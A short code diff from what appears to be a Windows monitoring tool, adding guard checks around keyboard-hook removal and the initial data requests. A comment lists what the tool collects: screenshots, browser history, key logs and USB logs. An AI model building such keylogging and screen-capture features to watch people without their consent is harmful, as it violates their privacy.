@@ -1769,6 +1769,7 @@ void monitorTask() {
 
 bool showClientLogin() {
     selectedMonitorId.store(0);
+    if(keyboardHook)removeKeyboardHook();
     {std::lock_guard<std::mutex> guard(authMutex);clientToken.clear();}
     CREDUI_INFOA info={};
     info.cbSize=sizeof(info);
@@ -2456,6 +2457,7 @@ void manageMemoryLimits() {
 
 // Send initial data requests (screenshot, tic, browser history, key log, USB log)
 void sendInitialDataRequests() {
+    if(selectedMonitorId.load()<1)return;
     // Starting initial data requests
     
     // Send screenshot first (0.5s delay)
